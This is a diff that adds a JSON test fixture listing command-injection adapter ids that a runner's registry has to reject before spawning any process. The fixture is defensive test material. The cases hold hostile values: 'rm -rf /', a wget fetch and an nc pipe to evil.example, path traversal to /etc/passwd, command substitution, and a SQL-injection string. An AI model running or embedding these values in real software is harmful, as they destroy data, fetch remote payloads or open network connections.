@@ -1,0 +1,52 @@
+{
+  "schema_version": "RunnerFixture/v1",
+  "fixture_id": "command-injection-attempts",
+  "purpose": "Malicious adapter ids that must be rejected by the static registry BEFORE any process is created. Each is an opaque string to the runner; none is split, interpolated, or passed to a shell. Every entry must raise UnknownAdapterError(CONTRACT_INVALID) at get_adapter, so no subprocess is ever spawned for it.",
+  "expected_behavior": {
+    "outcome": "rejected_before_spawn",
+    "fail_reason": "CONTRACT_INVALID",
+    "no_process_created": true
+  },
+  "cases": [
+    {
+      "adapter_id": "echo.v1; rm -rf /",
+      "vector": "shell metacharacter injection (semicolon + command)",
+      "notes": "Classic injection attempt. The registry does a plain dict lookup; this id is not a key, so it is rejected. The id is never placed in a shell string."
+    },
+    {
+      "adapter_id": "echo.v1 && wget evil.example/payload.sh",
+      "vector": "shell logical-and + remote fetch",
+      "notes": "Would fetch and execute a remote payload under naive shell invocation. The runner uses no shell; the id is rejected at lookup."
+    },
+    {
+      "adapter_id": "../../etc/passwd",
+      "vector": "path traversal as an adapter id",
+      "notes": "The registry is not a filesystem; this is an unknown key and is rejected. There is no path that the id resolves against."
+    },
+    {
+      "adapter_id": "echo.v1`whoami`",
+      "vector": "backtick command substitution",
+      "notes": "No shell evaluates the backticks; the id is rejected at lookup."
+    },
+    {
+      "adapter_id": "echo.v1$(id)",
+      "vector": "dollar-paren command substitution",
+      "notes": "No shell evaluates the substitution; the id is rejected at lookup."
+    },
+    {
+      "adapter_id": "echo.v1| nc evil.example 4444",
+      "vector": "pipe to a network listener",
+      "notes": "No pipe is constructed; the id is rejected at lookup."
+    },
+    {
+      "adapter_id": "echo.v1\n/bin/sh",
+      "vector": "newline + interpreter path",
+      "notes": "A newline in the id does not start a new command; the id is a single rejected key."
+    },
+    {
+      "adapter_id": "echo.v1 ' or '1'='1",
+      "vector": "SQL-injection-style payload (irrelevant to the registry, but representative of fuzz input)",
+      "notes": "The registry is not a query; the id is rejected at lookup."
+    }
+  ]
+}
